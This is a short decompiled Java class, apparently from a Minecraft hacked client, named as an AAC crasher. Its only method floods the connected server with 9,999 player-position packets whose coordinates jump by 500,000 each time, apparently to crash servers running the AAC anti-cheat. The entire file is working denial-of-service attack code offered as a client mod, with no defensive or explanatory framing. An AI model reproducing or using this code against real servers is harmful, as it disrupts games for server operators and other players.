// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.aac;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class AacCrasher4
{
    public static void start() {
        for (int index = 0; index < 9999; ++index) {
            Minecraft.getMinecraft().getConnection().sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX + 500000 * index, Minecraft.getMinecraft().player.getEntityBoundingBox().minY + 500000 * index, Minecraft.getMinecraft().player.posZ + 500000 * index, true));
        }
    }
}
